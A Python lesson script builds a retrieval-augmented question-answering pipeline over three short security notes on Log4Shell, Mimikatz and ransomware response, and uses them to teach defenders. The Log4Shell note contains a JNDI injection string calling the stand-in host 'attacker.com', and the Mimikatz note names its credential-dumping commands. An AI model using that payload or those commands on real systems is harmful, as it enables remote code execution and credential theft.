# Lesson 4.4 — RAG (Retrieval-Augmented Generation)
#
# Build a RAG pipeline that lets any LLM answer questions
# grounded in your own security documents.
#
# Works with Claude, OpenAI, or Gemini — whichever key you have set.
# Set ONE of:
#   set ANTHROPIC_API_KEY=...
#   set OPENAI_API_KEY=...
#   set GOOGLE_API_KEY=...
#
# pip install sentence-transformers  (or scikit-learn as fallback)

import numpy as np
from typing import List, Dict
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from llm_client import get_client

provider, client = get_client()

print("=" * 60)
print("  LESSON 4.4: RAG — SECURITY DOCUMENT Q&A")
print("=" * 60)

# ── 1. Sample security knowledge base ─────────────────────────────────────────
SECURITY_DOCS = {
    "log4shell": """
CVE-2021-44228 — Log4Shell (Critical CVSS 10.0)
Affected: Apache Log4j2 2.0-beta9 through 2.14.1
Attack: ${jndi:ldap://attacker.com/x} injected into any logged field triggers remote class loading.
No authentication required. Exploitable via HTTP User-Agent, X-Forwarded-For, or any logged parameter.
Remediation: Upgrade to Log4j 2.17.1+. Mitigation: -Dlog4j2.formatMsgNoLookups=true.
Detection: Outbound LDAP from app servers. ${jndi: patterns in web logs.
""",
    "mimikatz": """
Mimikatz — Credential Dumping (MITRE T1003)
Extracts plaintext passwords, NTLM hashes, and Kerberos tickets from Windows LSASS memory.
Common techniques: sekurlsa::logonpasswords, lsadump::dcsync, kerberos::golden (Golden Ticket).
Detection: LSASS memory access by non-system processes (Sysmon Event ID 10), unexpected lsass.dmp files.
Mitigations: Enable Credential Guard, disable WDigest auth, use Protected Users group.
""",
    "ransomware_response": """
Ransomware Incident Response Playbook
Phase 1 (0-30 min): Confirm indicators, identify Patient Zero, assess blast radius. Do NOT reboot.
Phase 2 (30 min-2 hr): Isolate via VLAN (not shutdown), disable accounts, block C2 at perimeter.
Phase 3 (2-24 hr): Remove persistence mechanisms, reset all credentials, patch initial access vector.
Phase 4 (1-7 days): Restore from clean backups, prioritise critical systems, monitor for re-infection.
Phase 5: Root cause analysis, update detection rules, test backups.
""",
}

# ── 2. Chunking ────────────────────────────────────────────────────────────────
def chunk_document(text: str, size: int = 100, overlap: int = 15) -> List[str]:
    words = text.split()
    chunks = []
    for i in range(0, len(words), size - overlap):
        c = ' '.join(words[i:i + size])
        if len(c.split()) > 20:
            chunks.append(c)
    return chunks

all_chunks, chunk_sources = [], []
for name, text in SECURITY_DOCS.items():
    for chunk in chunk_document(text):
        all_chunks.append(chunk)
        chunk_sources.append(name)

print(f"\nKnowledge base: {len(SECURITY_DOCS)} documents → {len(all_chunks)} chunks")

# ── 3. Embedding ───────────────────────────────────────────────────────────────
try:
    from sentence_transformers import SentenceTransformer
    print("Loading sentence-transformers embedding model...")
    _embed_model = SentenceTransformer('all-MiniLM-L6-v2')
    chunk_embeddings = _embed_model.encode(all_chunks)
    def embed(text): return _embed_model.encode([text])[0]
except ImportError:
    from sklearn.feature_extraction.text import TfidfVectorizer
    print("Using TF-IDF embeddings (run: pip install sentence-transformers for better results)")
    _tfidf = TfidfVectorizer(stop_words='english')
    chunk_embeddings = _tfidf.fit_transform(all_chunks).toarray()
    def embed(text): return _tfidf.transform([text]).toarray()[0]

# ── 4. Retrieval ───────────────────────────────────────────────────────────────
def retrieve(question: str, k: int = 3) -> List[Dict]:
    q = embed(question)
    scores = [np.dot(q, c) / (np.linalg.norm(q) * np.linalg.norm(c) + 1e-8)
              for c in chunk_embeddings]
    top = sorted(enumerate(scores), key=lambda x: x[1], reverse=True)[:k]
    return [{'text': all_chunks[i], 'source': chunk_sources[i], 'score': s}
            for i, s in top if s > 0.05]

# ── 5. RAG generation ─────────────────────────────────────────────────────────
def ask(question: str) -> str:
    retrieved = retrieve(question)
    if not retrieved:
        return "No relevant information found in the knowledge base."

    context = "\n\n".join([f"[{r['source']}]\n{r['text']}" for r in retrieved])

    print(f"\n{'='*50}")
    print(f"Q: {question}")
    print(f"Retrieved: {', '.join(set(r['source'] for r in retrieved))}")

    if client is None:
        print("A: [No API key — showing retrieval only]")
        print(f"   Top chunk: {retrieved[0]['text'][:150]}...")
        return ""

    system = """Answer questions using ONLY the provided context.
If the answer is not in the context, say so clearly — do not hallucinate.
Cite the source document name."""

    prompt = f"Context:\n{context}\n\nQuestion: {question}"

    answer = client.chat(
        system=system,
        messages=[{"role": "user", "content": prompt}],
        max_tokens=400,
    )
    print(f"\nA: {answer}")
    return answer

# ── 6. Test questions ──────────────────────────────────────────────────────────
print("\n── Testing RAG System ──")
questions = [
    "How do I detect Mimikatz on a Windows machine?",
    "What should I do in the first 30 minutes of a ransomware attack?",
    "How does Log4Shell get exploited and how do I fix it?",
]
for q in questions:
    ask(q)

# ── 7. Hallucination demo ──────────────────────────────────────────────────────
if client:
    print("\n\n── Hallucination Demo ──")
    q = "What is our organisation's specific recovery time objective?"
    retrieved = retrieve(q)
    context = "\n\n".join([f"[{r['source']}]\n{r['text']}" for r in retrieved]) if retrieved else ""

    print("\nWITH RAG (grounded):")
    ask(q)

    print("\nWITHOUT RAG (may hallucinate):")
    answer = client.chat(
        system="You are a cybersecurity expert. Answer concisely.",
        messages=[{"role": "user", "content": q}],
        max_tokens=200,
    )
    print(f"A: {answer}")

print("\n" + "=" * 60)
print("RAG pipeline complete. Next: Milestone — full security assistant.")
